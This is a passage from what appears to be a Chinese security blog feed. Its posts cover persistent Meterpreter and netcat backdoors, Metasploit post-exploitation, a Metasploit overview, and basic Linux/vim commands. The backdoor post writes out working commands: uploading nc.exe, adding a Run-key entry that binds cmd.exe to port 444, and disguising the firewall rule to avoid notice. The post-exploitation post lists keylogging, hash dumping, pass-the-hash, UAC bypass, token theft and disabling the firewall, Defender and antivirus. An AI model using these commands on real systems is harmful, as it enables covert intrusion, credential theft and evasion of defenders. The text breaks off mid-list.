    <content type="html"><![CDATA[<p>创建永久后门的方法</p><a id="more"></a><h1 id="MSF和NC永久后门植入"><a href="#MSF和NC永久后门植入" class="headerlink" title="MSF和NC永久后门植入"></a>MSF和NC永久后门植入</h1><ul><li>为什么要植入后门？<ul><li>Meterpreter Shell运行于内存之中，重启之后就将失效</li><li>避免重复性的渗透工作</li><li>漏洞修复后仍旧可以维持控制</li><li>存在于内存中不读取磁盘文件，不易被发现</li><li>有些漏洞多次利用后服务器或漏洞会损坏</li></ul></li></ul><h2 id="01-MSF后门"><a href="#01-MSF后门" class="headerlink" title="01 MSF后门"></a>01 MSF后门</h2><h3 id="metsvc后门"><a href="#metsvc后门" class="headerlink" title="metsvc后门"></a>metsvc后门</h3><ul><li>使用run metsvc启动<ul><li>-A 自动连接后门</li><li>-h 查看帮助菜单</li><li>-r 卸载已存的后门（文件要手动删除）</li></ul></li></ul><p><img src="1.png" srcset="/img/loading.gif" alt=""></p><p><img src="2.png" srcset="/img/loading.gif" alt=""></p><ul><li>端口固定为31337，如果扫描发现31337打开，就很可能被植入过后门</li><li>防火墙和UAC可能会影响后门</li></ul><h3 id="persistence后门"><a href="#persistence后门" class="headerlink" title="persistence后门"></a>persistence后门</h3><ul><li>使用 run persistence -h 查看帮助菜单，如图</li></ul><p><img src="3.png" srcset="/img/loading.gif" alt=""></p><ul><li>比较重要的参数有：<ul><li>-A 自动连接后门</li><li>-P 设置payload，默认为 windows/meterpreter/reverse_tcp 默认32位，当目标机器为64位时将无法运行</li><li>-U 设置后门在用户登录后自动启动，推荐使用</li><li>-X 设置后门在用户登录后自动启动，在非管理员权限或未进行BypassUAC时不推荐使用</li><li>-i 设置反向连接的时间间隔</li><li>-p 设置反向连接的端口号</li><li>-r 设置反向连接的IP地址</li></ul></li></ul><p>运行persistence后门，设置了时间间隔为20</p><p><img src="4.png" srcset="/img/loading.gif" alt=""></p><p>成功获取了Session，编号是21</p><p><img src="5.png" srcset="/img/loading.gif" alt=""></p><p>手动关闭获取的Session</p><p><img src="6.png" srcset="/img/loading.gif" alt=""></p><p>由于设置了i参数，20s后重新获得了Session，编号变成了22</p><p><img src="7.png" srcset="/img/loading.gif" alt=""></p><p>由于使用了-X参数，目标靶机重启后也会自动连接上Session</p><h2 id="02-NC后门"><a href="#02-NC后门" class="headerlink" title="02 NC后门"></a>02 NC后门</h2><h3 id="基本指令"><a href="#基本指令" class="headerlink" title="基本指令"></a>基本指令</h3><ul><li>上传nc<br>upload /root/nc.exe C:\\windows\system32</li><li>修改注册表<ul><li>枚举注册表键值<br>reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run</li><li>在当前主键下增加一个nc键值<br>reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d ‘C:\\windows\system32\nc.exe -Ldp 444 -e cmd.exe’</li><li>查看键值<br>reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc</li></ul></li><li>设置防火墙<ul><li>开启一个cmd通道<br>Execute -f cmd -i -H</li><li>查看防火墙状态<br>Netsh firewall show opmode</li><li>添加防火墙规则允许444端口通过<br>Netsh firewall add portopening TCP 444 “Service Firewall” ENABLE</li><li>查看端口状态<br>Netsh firewall show portopening</li></ul></li><li>开始连接<br>nc -v ip port</li></ul><h3 id="操作实例"><a href="#操作实例" class="headerlink" title="操作实例"></a>操作实例</h3><p> 添加键值 -Ldp 444 -e cmd.exe 表示把cmd转发的444端口</p><p><img src="8.png" srcset="/img/loading.gif" alt=""></p><p>查看添加的键值</p><p><img src="9.png" srcset="/img/loading.gif" alt=""></p><p>登录到cmd</p><p><img src="10.png" srcset="/img/loading.gif" alt=""></p><p>直接关闭防火墙容易引起怀疑，可以将444端口伪装成正常的防火墙而不被过滤，不容易被发现</p><p><img src="11.png" srcset="/img/loading.gif" alt=""></p><p>靶机重启后自动运行了nc.exe,后门仍然有效<br>在kali中使用nc进行连接，获得shell</p><p><img src="12.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具使用</tag>
      
      <tag>渗透测试</tag>
      
      <tag>MSF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux常用命令</title>
    <link href="/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/"/>
    <url>/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>Linux和vim最常用的一些命令</p><a id="more"></a><h1 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h1><h2 id="01-系统命令"><a href="#01-系统命令" class="headerlink" title="01 系统命令"></a>01 系统命令</h2><ul><li>whoami 查看当前用户</li><li>ifconfig 查看网卡信息</li><li>netstat 查看端口信息<ul><li>-a 列出所有端口</li><li>-t TCP端口</li><li>-u UDP 端口</li><li>-l 查看监听端口</li><li>-s 统计端口信息</li><li>-p 显示PID和进程名称</li><li>-n 不显示主机、端口和用户名，用英文代替</li><li>-c 每秒持续输出</li><li>-r 显示核心路由信息</li><li>-i 显示网络接口列表</li></ul></li><li>history 查看命令历史记录</li><li>clear 清屏</li><li>alias 为命令设置别名<ul><li>alias lx=ls 将lx设置为ls的别名</li></ul></li><li>–help 查看帮助信息</li><li>man 查看手册</li><li>&gt; 将输出结果保存到指定文件（覆盖）</li><li>&gt;&gt; 将输出结果保存到指定文件（在尾部追加）</li><li>| 管道，将前面命令的输出结果作为后面命令的输入</li><li>reboot 重启</li><li>shutdown 关机<ul><li>-h 指定时间<ul><li>-h now 立即关机</li><li>-h +10 十分钟后关机</li></ul></li></ul></li><li>常用快捷键<ul><li>tab 自动补齐</li><li>Ctrl+U 清空至行首</li><li>Ctrl+K 清空至行尾</li><li>Ctrl+L 清屏</li><li>Ctrl+C 取消命令编辑或执行</li></ul></li></ul><h2 id="02-目录与文件操作"><a href="#02-目录与文件操作" class="headerlink" title="02 目录与文件操作"></a>02 目录与文件操作</h2><ul><li><p>pwd 查看当前目录</p></li><li><p>cd 切换目录</p><ul><li>cd+绝对路径</li><li>cd+相对路径</li><li>cd ~ 返回用户目录</li><li>cd . 不切换，仍然在当前目录</li><li>cd .. 切换到上级目录</li><li>cd ../.. 切换到上上级目录</li><li>cd - 切换到上一次访问的目录</li></ul></li><li><p>ls 查看文件与文件夹</p><ul><li>ls -a 查看所有文件与文件夹（包含隐藏内容）</li><li>ls -l 以列表的形式显示详细信息（包括权限信息、时间、大小等）</li><li>ls -h 配合-l使用，将大小以k为单位显示</li><li>ls -R 递归列出子文件夹与子文件</li></ul></li><li><p>tree 查看树状结构</p></li><li><p>find 查找文件</p></li><li><p>touch 创建文件</p><ul><li>touch+文件名 创建单个文件，可以用空格分开，同时创建多个文件</li><li>touch+文件名{起始字符..终止字符} 批量创建文件<br>如 touch test{a..d} 就创建了testa,testb,testc,testd四个文件</li></ul></li><li><p>mkdir 创建文件夹</p><ul><li>mkdir -p 创建多个文件</li></ul></li><li><p>mv 移动并重命名文件，文件夹</p><ul><li>mv 要重命名的文件 新文件名</li><li>mv 要移动的文件名 目标目录</li><li>mv -i 询问移动时是否覆盖同名文件</li><li>mv -b 不覆盖，将原来的同名文件备份</li><li>mv -f 强制覆盖</li></ul></li><li><p>cp 复制文件</p><ul><li>cp -i 询问复制时是否覆盖同名文件</li><li>cp -f 强制覆盖</li><li>cp -r 复制文件夹及其子文件夹和文件</li></ul></li><li><p>cat 查看文件内容</p></li><li><p>more 分页查看文件内容</p></li><li><p>less 分行查看文件内容</p></li><li><p>head -n 查看文件前n行，默认为10</p></li><li><p>tail -n 查看文件后n行，默认为10</p></li><li><p>rm 删除文件，文件夹</p><ul><li>rm -i 删除时进行询问</li><li>rm -f 强制删除</li><li>rm -r 删除文件夹</li></ul></li><li><p>ln 建立链接</p><ul><li>ln 源文件 链接文件 硬链接，占用硬盘空间</li><li>ln -s 源文件 链接文件 软链接，不占用硬盘空间</li></ul></li><li><p>grep 用于过滤搜索指定的字符串</p><ul><li>-a \ –text 不忽略二进制的数据</li><li>-c \ –count 计算查找结果的列数</li><li>-E &lt;匹配样式&gt;\ –extended-regexp=&lt;匹配样式&gt; 使用正则表达式匹配</li><li>-i \ –ignore-case 忽略大小写</li><li>-n \ –line-number 显示匹配结果的列的编号</li><li>-v \ –revert-match 显示不匹配的所有行</li></ul></li><li><p>tar 压缩和解压</p><ul><li><p>-c / –create 创建新的备份文件</p></li><li><p>-C 在特定的目录解压缩</p></li><li><p>-v 显示操作过程</p></li><li><p>-f &lt;文件名&gt; / –file=&lt;文件名&gt; 指定备份文件</p></li><li><p>-x / –extract / –get 从备份文件中还原文件</p></li><li><p>-t / –list 列出备份文件的内容</p></li><li><p>-z 打包后，以 gzip 压缩</p></li><li><p>-j 打包后，以 bzip2 压缩 </p></li><li><p>常用命令</p><ul><li>压　缩：tar -jcvf filename.tar.bz2 要被压缩的文件或目录名称</li><li>查　询：tar -jtvf filename.tar.bz2</li><li>解压缩：tar -jxvf filename.tar.bz2 -C 欲解压缩的目录</li></ul></li></ul></li></ul><h2 id="03-账号与权限"><a href="#03-账号与权限" class="headerlink" title="03 账号与权限"></a>03 账号与权限</h2><ul><li><p>用户账号分类（标识符UID）</p><ul><li>超级用户</li><li>程序用户</li><li>普通用户</li></ul></li><li><p>组账号分类（标识符GID）</p><ul><li>基本组</li><li>附加组</li></ul></li><li><p>信息存储</p><ul><li>/etc/passwd 保存了用户信息</li><li>/etc/shadow 保存了密码信息</li><li>/etc/group 保存了组信息</li></ul></li><li><p>useradd 添加用户</p><ul><li>-d 指定用户主目录，如果不存在就使用-m选项新建目录</li><li>-g 指定所属的用户组</li><li>-G 指定所属的附加组</li><li>-s 指定登录shell</li><li>-u 指定用户号</li><li>-o 可以重复使用其他用户的用户号</li></ul></li><li><p>userdel 删除用户</p><ul><li>-r 将用户的主目录一起删除</li></ul></li><li><p>usermod 修改用户信息，选项与useradd相似</p></li><li><p>passwd 修改密码（超级用户可以修改其他用户的密码）</p><ul><li>-l 禁用账号</li><li>-u 口令解锁</li><li>-d 使账号口令为空</li><li>-f 使用户下次登录时修改口令</li></ul></li><li><p>groupadd 添加组</p><ul><li>-g 指定组标识号</li><li>-o 可以重复使用其他组的组号</li><li>-n 将组的名字改为新名字</li></ul></li><li><p>newgrp 组名 切换到其他组</p></li><li><p>文件类型</p><ul><li>d 目录</li><li>- 文件</li><li>l 链接文件</li><li>b 可控存储的接口设备</li><li>c 串行端口设备</li></ul></li><li><p>文件权限</p><ul><li>r 读取，对应数字4</li><li>w 写入，对应数字2</li><li>x 执行，对应数字1</li></ul></li><li><p>chgrp 属组名 文件名 更改文件属组</p><ul><li>-R 递归更改</li></ul></li><li><p>chown 属主名(:属组名) 文件名 更改属主（和属组）</p><ul><li>-R 递归更改</li></ul></li><li><p>chmod 三位数字 文件或目录 更改权限为数字对应的权限</p><ul><li>-R 递归更改</li></ul></li><li><p>chmod u=rwx,g=rx,o=r 文件名 属主设为rwx，属组为rx，其他为r</p><ul><li>u表示属主，g表示属组，o表示其他</li><li>+ 增加权限、- 去除权限、=设定为权限</li></ul></li></ul><h2 id="04-进程"><a href="#04-进程" class="headerlink" title="04 进程"></a>04 进程</h2><ul><li>ps 查看进程<ul><li>a 查看所有程序，包括其他用户的程序</li><li>u 用以用户为主的格式显示</li><li>x 显示所有程序，不以终端机来区分</li><li>c 显示每个程序真正的指令名称</li><li>e 显示每个程序的环境变量</li><li>-A 显示所有程序</li><li>-H 显示树状结构（pstree）</li><li>-N 显示所有程序，除了执行ps指令的终端机下的程序</li><li>-t 指定终端机编号</li></ul></li><li>pgrep 查找进程<ul><li>-o 显示最小的进程号</li><li>-n 显示最大的进程号</li><li>-l 显示进程名称</li><li>-p 指定父进程好</li><li>-g 指定进程组</li><li>-t 指定终端</li><li>-u 指定用户ID</li></ul></li><li>kill 终止进程号对应的进程<ul><li>-9 强制终止</li></ul></li><li>top 查看当前进程的资源占用情况<ul><li>-u 指定用户名</li><li>-p 指定进程号</li><li>-c 显示完整命令</li><li>-n 设置更新次数</li><li>-d 设置更新间隔，单位秒</li></ul></li><li>进程操作<ul><li>Ctrl+z 将前台进程调入后台</li><li>Ctrl+c 强制结束进程</li><li>jobs 查看后台进程</li><li>fg n 将后台第n个进程在前台运行</li><li>bg n 将后台第n个进程在后台运行</li><li>&amp; 将进程放在后台运行</li></ul></li></ul><h2 id="05-计划任务"><a href="#05-计划任务" class="headerlink" title="05 计划任务"></a>05 计划任务</h2><ul><li><p>crontab 周期性计划任务</p><ul><li><p>配置文件 /etc/crontab</p></li><li><p>启动服务 service crond start</p><ul><li>类似的还有stop,restart,reload,status</li></ul></li><li><p>查看是否为开机启动 ntsysv</p><ul><li>设置为开机启动ntsysv -level 35 crond on</li></ul></li><li><p>配置内容（文件前四行）</p><ul><li>SHELL 使用的shell</li><li>PATH 执行命令的路径</li><li>MAILTO 将执行信息使用电子邮件发送给root用户</li><li>HOME 使用的主目录</li></ul></li><li><p>执行命令的格式</p><ul><li><p>minute hour day month week command</p></li><li><p>各字段可以用以下特殊符号</p><ul><li>* 星号代表所有可能的值</li><li>, 逗号分隔多个取值</li><li>- 表示一个整数范围（包括两端）</li><li>/ 表示间隔，如hour字段的0-23/2 表示每天每两小时执行一次</li></ul></li></ul></li><li><p>crontab -e [-u 用户名] 编辑计划任务</p></li><li><p>crontab -l [-u 用户名] 查看计划任务</p></li><li><p>crontab -r [-u 用户名] 删除计划任务</p><ul><li>如果编辑时没有指定用户名表示为当前用户设定计划任务 </li></ul></li></ul></li><li><p>at 执行一次性任务</p><ul><li><p>命令格式 now + count time-units 表示从现在开始过多久执行任务</p></li><li><p>-f 指定包含具体指令的任务文件</p></li><li><p>-q 指定新任务的队列名称</p></li><li><p>-l 显示待执行任务的列表</p></li><li><p>-d 删除指定的待执行任务</p></li><li><p>-m 任务执行完成后向用户发送</p></li><li><p>atq 查看当前的任务列表</p></li><li><p>atrm n 删除编号为n的任务</p></li><li><p>at -c n 查看编号为n的任务的内容</p></li></ul></li></ul><h2 id="06-vim"><a href="#06-vim" class="headerlink" title="06 vim"></a>06 vim</h2><ul><li><p>三种模式的转换</p><ul><li>命令模式==》末行模式 ：键</li><li>命令模式==》输入模式 a,i,o键</li><li>输入模式、末行模式==》命令模式 Esc键</li></ul></li><li><p>命令模式操作</p><ul><li>光标移动<br>方向键或k、j、h、l</li><li>翻页<ul><li>向下翻页 PageDown 或 Ctrl+F</li><li>向上翻页 PageUp 或 Ctrl+B</li></ul></li><li>行内跳转<br>HOME键、^键、数字0</li><li>行间跳转<ul><li>1G、gg跳转到首行</li><li>G 跳转到末行</li><li>nG 跳转到第n行</li></ul></li><li>剪切（删除）<ul><li>x、Del键 删除当前光标处的单个字符</li><li>dd 剪切当前行</li><li>ndd 剪切从光标处开始的n行</li><li>d^ 删除当前光标到行首的所有内容</li><li>d$ 删除当前光标到行尾的所有内容</li></ul></li><li>复制<ul><li>yy 复制当前行</li><li>nyy 复制从光标处开始的n行</li></ul></li><li>粘贴<ul><li>p 粘贴到当前行下</li><li>P 粘贴到当前行上</li></ul></li><li>撤销<ul><li>u 取消最近一次操作</li><li>U 取消当前行的所有操作</li></ul></li><li>保存<br>ZZ 保存并退出当前编辑</li></ul></li><li><p>末行模式</p><ul><li><p>查找</p><ul><li>/word 从上至下在文中查找word字符串</li><li>?word 从下至上在文中查找word字符串</li><li>n 定位下一个匹配字</li><li>N 定位上一个匹配字</li></ul></li><li><p>显示行号</p><ul><li>:set nu 显示行号</li><li>:set nonu 取消显示行号</li></ul></li><li><p>保存</p><ul><li>:w 保存修改内容</li><li>:w /path/file 另存为</li></ul></li><li><p>退出</p><ul><li>:q 未修改退出</li><li>:q! 放弃修改强制退出</li></ul></li><li><p>保存并退出</p><p>:wq! 保存退出</p></li><li><p>打开新文件编辑</p><p>:e /path/file</p></li><li><p>读入文件内容到当前编辑</p><p>:r /path/file</p></li><li><p>将当前行查找到的第一个字符串old替换为new</p><p>:s /old/new</p></li><li><p>将当前行查找到的所有字符串old替换为new</p><p>:s /old/new/g</p></li><li><p>在行号范围 #,#内查找到的所有字符串old替换为new</p><p>:#,# s /old/new/g</p></li><li><p>在整个文件内查找到的所有字符串old替换为new<br>:% s old/new/g</p></li><li><p>在替换命令末尾加上c，用户将对每次替换进行确认</p></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Metasploit后渗透</title>
    <link href="/Metasploit%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    <url>/Metasploit%E5%90%8E%E6%B8%97%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<p>权限提升、信息收集、HASH、关闭防火墙、令牌假冒</p><a id="more"></a><h1 id="Metasploit后渗透"><a href="#Metasploit后渗透" class="headerlink" title="Metasploit后渗透"></a>Metasploit后渗透</h1><h2 id="01-权限提升"><a href="#01-权限提升" class="headerlink" title="01 权限提升"></a>01 权限提升</h2><ol><li><p><strong>权限提升</strong><br>使用msf获取sessions后，可以使用getuid查看当前用户<br><img src="1.png" srcset="/img/loading.gif" alt=""><br>当前为root权限，不是system权限</p><p>权限提升有三种方法：</p><ul><li>提高程序运行级别</li><li>UAC绕过</li><li>利用提权漏洞进行提权</li></ul></li><li><p><strong>提高程序运行级别</strong><br>使用的msf模块：exploit/windows/local/ask</p><p><img src="2.png" srcset="/img/loading.gif" alt=""><br>设置session的ID，使用run执行即可</p><p>再次切换到session，使用getsystem命令提权<br>发现已经获得了system权限</p><p><img src="3.png" srcset="/img/loading.gif" alt=""></p><p><strong>这种方法需要靶机在弹出框中点击允许，容易被防范</strong></p></li><li><p><strong>UAC绕过</strong><br>使用的msf模块：exploit/windows/local/bypassuac</p><p><img src="4.png" srcset="/img/loading.gif" alt=""><br>设置session的ID，然后执行</p><p>再次切换到session，使用getsystem命令提权<br>发现已经获得了system权限</p><p><img src="3.png" srcset="/img/loading.gif" alt=""></p><p><strong>这种方法不需要需要靶机参与</strong></p></li><li><p><strong>利用提权漏洞进行提权</strong><br>使用的msf模块：exploit/windows/local/ms14_058_track_popup_menu</p><p><img src="5.png" srcset="/img/loading.gif" alt=""></p><p>仍然是设置session的ID，然后执行<br>再次切换到session,使用getid命令，发现已经获得了system权限，不需要再次执行getsystem命令</p></li></ol><h2 id="02-信息收集"><a href="#02-信息收集" class="headerlink" title="02 信息收集"></a>02 信息收集</h2><ol><li><p><strong>信息收集相关模块</strong></p><ul><li>获取硬盘分区：run post/windows/gather/forensics/enum_drives</li><li>判断是否为虚拟机：run post/windows/gather/checkvm</li><li>查看开启的服务：run post/windows/gather/enum_services</li><li>查看共享：run post/windows/gather/enum_shares</li><li>查看最近的文件操作：run post/windows/gather/dumplinks</li><li>查看安装的软件信息：run post/windows/gather/enum_applications</li><li>查看补丁信息：run post/windows/gather/enum_patches</li><li>查看域控：run post/windows/gather/enum_domain</li><li>开启键盘记录： run keyscan_start</li><li>显示键盘记录：run keyscan_dump</li><li>停止键盘记录：run keyscan_stop</li><li>开启远程桌面：run post/windows/manage/enable_rdp run getgui -e</li><li>截图：screenshot</li><li>获取Chrome缓存：run post/windows/gather/enum_chrome</li><li>获取Firefox缓存：run post/windows/gather/enum_firefox</li><li>获取IE缓存：run post/windows/gather/enum_ie</li><li>获取常见信息： run scraper / run wienum</li></ul><p>执行run scraper命令<br><img src="6.png" srcset="/img/loading.gif" alt=""></p><p>导出的结果<br><img src="7.png" srcset="/img/loading.gif" alt=""></p><p>执行run winenum命令<br><img src="8.png" srcset="/img/loading.gif" alt=""></p><p>导出的结果<br><img src="9.png" srcset="/img/loading.gif" alt=""></p></li><li><p><strong>数据包捕获</strong></p><ul><li>抓包<ul><li>加载sniffer：load sniffer</li><li>查看网卡信息：sniffer_interface</li><li>开启监听：sniffer_start 1</li><li>导出数据包：sniffer_dump 1 1.cap</li></ul></li><li>解包<ul><li>run auxiliary/sniffer/psnuffle</li></ul></li><li>抓取的包也可以用wireshark打开</li><li>另外两种抓包方式<ul><li>run packetrecorder</li><li>run post/windows/manage/rpcapd_start</li></ul></li></ul></li></ol><h2 id="03-HASH"><a href="#03-HASH" class="headerlink" title="03 HASH"></a>03 HASH</h2><ol><li><p><strong>hash简介</strong><br>windows下hash密码的格式：用户名：RID：LM-HASH：NT-HASH</p><p>  Windows系统帐户对应固定的RID：</p><ul><li>500： ADMINISTRATOR</li><li>501： GUEST</li><li>502: krbtgt(域环境)</li><li>512: Domain Admins(域环境)</li><li>513: Domain Users(域环境)</li><li>514: Domain Guests(域环境)</li><li>515: Domain Computers(域环境)<ul><li>516: Domain Controllers(域环境)</li><li>1000:root</li></ul></li></ul><p>LM-HASH是IBM设计的，安全性较差</p><p>NT-HASH是微软设计的，较为安全</p></li><li><p><strong>获取hash值</strong></p><ul><li>hashdump</li><li>run post/windows/gather/hashdump<br>hashdump需要有system权限，或者root权限下绕过UAC</li><li>run post/windows/gather/smart_hashdump<br>smart_hashdump可以根据不同的权限和系统采取不同的行动</li></ul><p>hashdump<br><img src="10.png" srcset="/img/loading.gif" alt=""></p><p>run post/windows/gather/hashdump</p><p><img src="/11.png" srcset="/img/loading.gif" alt=""></p><p>run post/windows/gather/smart_hashdump</p><p><img src="12.png" srcset="/img/loading.gif" alt=""></p><p>即使获取了权限，也最好得到管理员的账号密码，防止陌生人登录被发现。并且管理员可能在多个服务器上使用了相同的账号密码</p></li><li><p><strong>HASH破解</strong></p><ul><li>在线破解</li><li>离线破解：findmyhash, L0phtCrack</li><li>msf模块：run auxiliary/analyze/jtr_crack_fast</li><li>hash传递：run exploit/windows/smb/psexec</li></ul><p>hash传递，不用破解，直接使用hash进行登录<br><img src="13.png" srcset="/img/loading.gif" alt=""></p><p>设置payload为反弹tcp，执行即可获取shell</p><p><img src="14.png" srcset="/img/loading.gif" alt=""></p><p>如图可见user为root</p><p><img src="15.png" srcset="/img/loading.gif" alt=""></p></li></ol><h2 id="04-关闭防火墙和杀毒软件"><a href="#04-关闭防火墙和杀毒软件" class="headerlink" title="04 关闭防火墙和杀毒软件"></a>04 关闭防火墙和杀毒软件</h2><ul><li><p>关闭防火墙（管理员及以上权限）（在Windows shell下执行）<br>Netsh advfirewall set allprofiles state off</p></li><li><p>关闭Defender（在Windows shell下执行）<br>Net stop windefend</p></li><li><p>关闭杀毒软件（在meterpreter下执行）</p><ul><li>run killav</li><li>run post/windows/manage/killava</li></ul></li></ul><h2 id="05-令牌假冒"><a href="#05-令牌假冒" class="headerlink" title="05 令牌假冒"></a>05 令牌假冒</h2><ol><li><p><strong>简介</strong><br>令牌假冒可以假冒一个网络中的另一个用户进行操作<br>令牌包括登录会话的安全信息，如用户身份识别、用户组和用户权限<br>当一个用户登录Windows系统是，他就被给定一个访问令牌作为认证会话的一部分</p></li><li><p><strong>Windows安全的相关概念</strong></p><ul><li>Session<ul><li>Session就是一次远程登录或本地登录</li><li>xp及之前每次登陆都会创建一个Session</li><li>vista以后所有交互程序都在Session0中，远程交互在Session1、Session2中</li></ul></li><li>Window Station<ul><li>Windows Station中有不同的desktop</li><li>win logon（登录的桌面）、screen saver（屏保的桌面）、default（平时用的桌面）</li></ul></li><li>Login Session<ul><li>不同的账号登录产生不同的login Session，代表不同的账号权限</li></ul></li><li>Token<ul><li>用户每次登陆，产生LoginSession分配的对应的Token</li><li>Token含有该进程用户账号信息、组信息、权限信息等</li><li>访问资源时会提交Token进行身份验证</li></ul></li></ul></li><li><p><strong>Incognito</strong></p><ul><li>独立软件，被集成到msf的meterpreter中</li><li>不用获取账号密码就能窃取Token伪装成合法用户</li><li>适用于域环境下提权渗透</li></ul><p><img src="16.png" srcset="/img/loading.gif" alt=""></p><p><img src="17.png" srcset="/img/loading.gif" alt=""></p></li></ol>]]></content>
    
    
    <categories>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
      <tag>权限提升</tag>
      
      <tag>工具使用</tag>
      
      <tag>渗透测试</tag>
      
      <tag>MSF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Metasploit简介</title>
    <link href="/Metasploit%E7%AE%80%E4%BB%8B/"/>
    <url>/Metasploit%E7%AE%80%E4%BB%8B/</url>
    
    <content type="html"><![CDATA[<p>Metasploit的模块与基本使用命令</p><a id="more"></a><h1 id="Metasploit简介"><a href="#Metasploit简介" class="headerlink" title="Metasploit简介"></a>Metasploit简介</h1><h2 id="01-简介"><a href="#01-简介" class="headerlink" title="01 简介"></a>01 简介</h2><p>Metasploit是一个开源的渗透测试软件，也是一个逐步发展成熟的漏洞研究与渗透测试代码开发平台（可扩展），此外也将成为支持整个渗透测试过程的安全技术集成开发与应用环境</p><p>Metasploit最初使用Perl语言写成，后来使用Ruby语言进行了重写</p><p>Metasploit集成了数百个攻击模块，可以通过自动化编码机制绕过攻击限制于检测措施，对目标系统实施远程攻击，获取系统的访问控制权</p><p>除渗透攻击外，Metasploit在发展过程中逐渐增加了对渗透测试全过程的支持，包括情报搜集、威胁建模、漏洞分析、后渗透攻击与报告生成</p><h2 id="02-模块"><a href="#02-模块" class="headerlink" title="02 模块"></a>02 模块</h2><ol><li><p><strong>辅助模块 Auxiliary</strong><br>用于信息搜集，包括对网络服务的扫描、敏感协议嗅探、口令猜测破解、实施网络协议欺骗等功能</p></li><li><p><strong>编码器模块 Encoders</strong><br>对payload进行加密</p></li><li><p><strong>空指令 NOP</strong><br>是一些对程序运行状态不会造成实质影响的空操作或者无关操作指令<br>用于提高payload的稳定性以及维持大小，使shellcode避免受到内存地址随机化、返回地址计算偏差等原因造成的执行失败</p></li><li><p><strong>渗透攻击 Exploits</strong><br>分为主动攻击和被动攻击</p><p>主动攻击所利用的安全漏洞位于网络服务端软件与服务承载的上层应用程序之中，由于这些服务通常是在主机上开启一些监听接口等待客户端连接，因此针对他们的渗透攻击可以主动发起</p><p>被动攻击所利用的安全漏洞位于客户端软件中，需要通过构造钓鱼网站、邮件、应用程序等诱骗目标用户打开，从而触发安全漏洞</p></li><li><p><strong>有效载荷 Payloads</strong></p><p>payload是指渗透攻击成功后使目标运行的一段代码，通常用来为攻击者打开在目标系统上的控制会话连接</p><p>可以分为single(完整的一体化的payload)、stagers(目标内存有限时，用于建立连接的较小的payload)、stages(使用stagers建立连接时后续的payload)三种</p></li><li><p><strong>后渗透 Post</strong></p><p>用于在渗透攻击获取到目标系统控制权后，在受控系统中进行各种后渗透攻击，如获取敏感信息、提权、跳板攻击等</p></li></ol><h2 id="03-模块使用"><a href="#03-模块使用" class="headerlink" title="03 模块使用"></a>03 模块使用</h2><ol><li><p><strong>启动Metasploit</strong><br>输入msfconsole，即可运行，会显示出随机的banner图案<br><img src="6.png" srcset="/img/loading.gif" alt=""></p></li><li><p><strong>用目录查询</strong></p><p>如可以使用 search auxiliary/scanner/portscan 查询所有端口扫描模块</p><p><img src="1.png" srcset="/img/loading.gif" alt=""></p></li><li><p><strong>用模块名查询</strong><br>如查询smb相关的模块 search smb</p><p><img src="2.png" srcset="/img/loading.gif" alt=""></p></li><li><p><strong>使用模块</strong><br>以ms17-010为例<br>使用search ms17-010查询<br><img src="3.png" srcset="/img/loading.gif" alt=""></p><p>Check表示是否对目标具有漏洞进行检查<br>选择第三个<br>use exploit/windows/smb/ms17_010_eternalblue</p><p>输入show options可以看到需要设置的参数<br>Required表示必要参数<br>使用info命令可以获得更详细的介绍</p><p><img src="4.png" srcset="/img/loading.gif" alt=""></p><p>使用set设置参数<br><img src="5.png" srcset="/img/loading.gif" alt=""></p><p>必要参数设置完成后，输入run或exploit进行执行，即可获得返回的shell</p></li><li><p><strong>一键生成木马</strong><br><img src="9.png" srcset="/img/loading.gif" alt=""><br>-a 指定32位或64位<br>–platform 指定平台<br>-p 设定payload<br>-b 设定空白字符<br>-e 设定编码方式<br>-f 设定文件类型</p></li></ol><h2 id="04-常用模块"><a href="#04-常用模块" class="headerlink" title="04 常用模块"></a>04 常用模块</h2><ol><li><strong>敏感目录扫描</strong><br>可以使用auxiliary中的brute_dirs、dir_listing、dir_scanner等进行敏感目录扫描，但是需要提供一个目录字典</li><li><strong>主机发现</strong><br>可以使用auxiliary/scanner/discovery/中的exploits<br><img src="7.png" srcset="/img/loading.gif" alt=""></li><li><strong>端口扫描</strong><br>可以使用auxiliary/scanner/portscan/中的exploits<br><img src="8.png" srcset="/img/loading.gif" alt=""><br>一般使用syn扫描，速度快且不易被发现</li><li><strong>服务查点</strong><ul><li>Telnet<br>auxiliary/scanner/telnet/telnet_version</li><li>SSH<br>auxiliary/scanner/ssh/ssh_version</li><li>MSSQL<br>auxiliary/scanner/mssql/mssql_ping</li></ul></li></ol><h2 id="05-常用命令"><a href="#05-常用命令" class="headerlink" title="05 常用命令"></a>05 常用命令</h2><ul><li><p>sessions<br>查看已获取的对话</p></li><li><p>sessions -i 编号<br>切换到编号对应的会话</p></li><li><p>background<br>将会话隐藏到后台</p></li><li><p>quit<br>关闭当前会话</p></li><li><p>shell<br>获取系统控制台的shell</p></li><li><p>pwd</p><p>查看当前目录</p></li><li><p>cd<br>切换目录</p></li><li><p>ls<br>列出当前目录下的内容</p></li><li><p>search<br>搜索文件</p></li><li><p>cat<br>查看文件内容</p></li><li><p>upload<br>上传文件</p></li><li><p>download<br>下载文件</p></li><li><p>edit<br>编辑文件</p></li><li><p>ipconfig / 